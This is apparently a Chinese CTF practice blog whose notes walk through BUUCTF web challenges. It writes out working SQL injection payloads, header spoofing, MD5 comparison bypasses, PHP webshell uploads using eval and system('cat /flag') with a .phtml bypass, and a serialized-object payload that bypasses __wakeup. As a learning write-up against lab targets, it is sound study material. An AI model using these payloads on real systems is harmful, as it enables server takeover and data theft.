words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words CHANGE flag id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>);#<br>//成功<br></code></pre></td></tr></table></figure>
<p>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语句背景分析：<br>这段 SQL 包含多个操作，核心目的是：<br><br>将表 <span class="hljs-built_in">words</span> 重命名为 words1。<br><br>将表 <span class="hljs-number">1919810931114514</span> 重命名为 <span class="hljs-built_in">words</span>。<br><br>修改新表 <span class="hljs-built_in">words</span> 的字段 flag，将其重命名为 <span class="hljs-built_in">id</span>，并更改其数据类型为 varchar(<span class="hljs-number">50</span>)。<br></code></pre></td></tr></table></figure>
<p>想不起当初的做题笔记了，只是看到正则的情况想到了改表明和列明，应该只是单纯的想起，因为连列名都忘了查</p>
<p>当时还记了其它绕过方法，<br>试一下预编译绕过</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables name;</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;show columns from `<span class="hljs-number">1919810931114514</span>`;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;flag&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;varchar(100)&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span><br>  [<span class="hljs-number">3</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  [<span class="hljs-number">4</span>]=&gt;<br>  NULL<br>  [<span class="hljs-number">5</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);exectue hack;@<br>&#x2F;&#x2F;不是，明明一模一样，为啥我手敲的执行不了<br>&#x2F;&#x2F;1’;prepare hack from concat(‘sele’,’ct’,’* from  <code>1919810931114514</code>‘);execute hack;#<br>&#x2F;&#x2F;woc，原来是excute</p>
<p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);execute hack;@</p>
<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>根据提示<br>f12 搜索secret，找到：<br><a target="_blank" rel="noopener" href="http://node5.buuoj.cn:27381/Secret.php">http://node5.buuoj.cn:27381/Secret.php</a><br>然后就是根据提示改请求头，  </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Access-Control-Allow-Origin:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">From:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-symbol">//Please</span> use <span class="hljs-string">&quot;Syclover&quot;</span> browser<br><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">Browser :</span> Syclover<br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">User-Agent:</span> Syclover<br><br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Syclover Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-operator">//</span>No<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span> you can only read this locally<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">From :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">X-Forwarded-For :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-operator">//</span>flag&#123;<span class="hljs-number">41</span>cea244-<span class="hljs-number">340</span>a-<span class="hljs-number">4</span>be9-bd6e-ba42db379119&#125;<br></code></pre></td></tr></table></figure>
<p>有点当初BuildCTF里的一题，但是那道题要改的更多</p>
<hr>
<h2 id="title-note-28date-2025-04-17-22-35-50tags-note"><a href="#title-note-28date-2025-04-17-22-35-50tags-note" class="headerlink" title="title: note-28date: 2025-04-17 22:35:50tags: note"></a>title: note-28<br>date: 2025-04-17 22:35:50<br>tags: note</h2><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>在bp查看相应，看到：<br>hint: select * from ‘admin’ where password&#x3D;md5($pass,true)<br>试一下ffifdyop<br>返回的页面中有：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">$a = $GET[&#x27;a&#x27;];</span><br><span class="hljs-comment">$b = $_GET[&#x27;b&#x27;];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="hljs-comment">    // wow, glzjin wants a girl friend.</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>
<p>不是怎么都在求girlfriend,<br>这个我猜能用数组绕过</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=r[]&amp;b=<span class="hljs-string">q[]</span><br>//不行<br>?a=<span class="hljs-string">&#x27;1&#x27;</span>&amp;b=<span class="hljs-number">1</span><br>//<span class="hljs-keyword">no</span><br></code></pre></td></tr></table></figure>
<p>那直接上网查md5加密后能弱等于的字符</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=%271%27&amp;&amp;b=<span class="hljs-number">1</span><br><span class="hljs-comment">//ok</span><br></code></pre></td></tr></table></figure>
<p>返回</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这个强不等于试一下’1’,1</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">param1=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-comment">//no</span><br><br>param1[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>[]=<span class="hljs-number">2</span><br><span class="hljs-comment">// flag&#123;8277b79d-033f-4f57-a8dd-d74d41893128&#125; </span><br><span class="hljs-comment">//原来我刚才用的数组绕过是写错的啊😅</span><br><span class="hljs-comment">//试了一下，levels91.php和levell14.php，都能直接用数组绕过</span><br></code></pre></td></tr></table></figure>

<h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>sql中md5的万能密码<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_12138/article/details/121847582">https://blog.csdn.net/Jeff_12138/article/details/121847582</a></p>
<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>正常穿了一次图片，显示了上传文件的储存目录</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/uplo4d/</span><br></code></pre></td></tr></table></figure>
<p>上网随便找个php一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hack&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>先把后最改为png在前端页面上传，或者直接改前端<br>然后用bp把后缀名改为php上传<br>提示nono  </p>
<p>后把后缀改为 .phtml<br>成功上传<br>最后蚁剑连接，在根目录发现flag  </p>
<h2 id="phtml-绕过"><a href="#phtml-绕过" class="headerlink" title="phtml 绕过"></a>phtml 绕过</h2><p>将文件后缀改为 .phtml，在 Apache 服务器上会被当作 PHP 文件执行。  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span>.phtml<br></code></pre></td></tr></table></figure>

<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>记录一下心路历程：<br>一开始以为是sql，然后看到前端代码里提示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">you are not admin <br></code></pre></td></tr></table></figure>
<p>以为是cookie，把初始的cookie解base64后好像出了个json格式的啥，试着把里面的”1”改为”admin”，<br>没用。<br>随后注册了一个账户，想起了数据库污染啥的，但是这题不是<br>注册账户后登录，然后更改密码，</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">123</span>&#x27;<span class="hljs-keyword">where</span> username=admin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>然后用123来登录admin，拿到flag<br>没想到一次成了</p>
<hr>
<h2 id="title-note-29date-2025-04-21-18-12-17tags-note"><a href="#title-note-29date-2025-04-21-18-12-17tags-note" class="headerlink" title="title: note-29date: 2025-04-21 18:12:17tags: note"></a>title: note-29<br>date: 2025-04-21 18:12:17<br>tags: note</h2><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;php.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;z&quot;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>显示上传成功，但是没找到目录在哪<br>在url试了一下<br>在这个目录  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/upload/</span>php.phtml<br></code></pre></td></tr></table></figure>
<p>试了好久发现马没生效</p>
<p>上网找了一个文件头</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;text.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);&lt;/script&gt;<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>from:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/120956861">https://blog.csdn.net/m0_55793759/article/details/120956861</a><br>成功</p>
<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>网址备份没思路，便上网查：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">常见的网站源码备份文件后缀:<br><br>tar.gz，<span class="hljs-built_in">zip</span>，rar，tar<br><br>常见的网站源码备份文件名：<br><br>web，website，backup，back，www，wwwroot，temp<br><br>后用<br>www.<span class="hljs-built_in">zip</span>下载备份源码<br></code></pre></td></tr></table></figure>
<p>里面有个flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>假flag，，，<br>审计index.php，<br>好像是反序列化？  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;I have a cat!&lt;/title&gt;<br>  &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;</span>&gt;<br>      &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;style.css&quot;</span>&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>    <span class="hljs-comment">#login&#123;   </span><br>        position: absolute;   <br>        top: <span class="hljs-number">50</span>%;   <br>        left:<span class="hljs-number">50</span>%;   <br>        margin: -<span class="hljs-number">150</span>px <span class="hljs-number">0</span> <span class="hljs-number">0</span> -<span class="hljs-number">150</span>px;   <br>        width: <span class="hljs-number">300</span>px;   <br>        height: <span class="hljs-number">300</span>px;   <br>    &#125;   <br>    h4&#123;   <br>        font-size: <span class="hljs-number">2</span>em;   <br>        margin: <span class="hljs-number">0.67</span>em <span class="hljs-number">0</span>;   <br>    &#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br><br><br><br><br><br><br><br>&lt;div id=<span class="hljs-string">&quot;world&quot;</span>&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;</span>&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;</span>&gt;不愧是我！！！<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;</span>&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;position: absolute;bottom: 5%;width: 99%;&quot;</span>&gt;&lt;p align=<span class="hljs-string">&quot;center&quot;</span> style=<span class="hljs-string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script  src=<span class="hljs-string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
<p>select-&gt;name,<br>好像要先查看admin密码  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br><br><span class="hljs-keyword">return</span>:<br>NO!!!hacker!!!<br>You name is: nonono<br>You password is: yesyes<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;guest&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>再仔细看了一下，应该是要绕过wakeup函数里的赋值，不然就没法让username&#x3D;admin，<br>上网差了一下，发现以前我好像做过wakeup绕过的题，那就是修改元素个数，<br>还是绕不过，去找wp,最后发现是有private，要用url加密，不然的话会有些不可显示字符的缺漏导致错误<br>未url加密：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>可以看到Nameusername，和Namepassowrd，这两元素是因为少了字符导致连起来了，编码后可以看到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
<p>正确的样式应该是： %00Name%00username , %00Name%00password<br>记得要把2改为3，找的有点眼花，也可以像wp那样传：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a><br><a href="https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/">https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/</a></p>
<hr>
<h2 id="title-note-30date-2025-04-23-19-58-29tags-note"><a href="#title-note-30date-2025-04-23-19-58-29tags-note" class="headerlink" title="title: note-30date: 2025-04-23 19:58:29tags: note"></a>title: note-30<br>date: 2025-04-23 19:58:29<br>tags: note</h2><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>扫目录一直扫不出来，扫了十来次，最后发现是是请求太快，</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u http://<span class="hljs-number">087</span>da459-<span class="hljs-number">7</span>de3-<span class="hljs-number">4061</span>-<span class="hljs-number">82</span>c8-b3cf69426d11.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w backup_include.txt --delay=<span class="hljs-number">1</span> -t <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>终于发现备份文件<br>&#x2F;index.php.bak  </p>
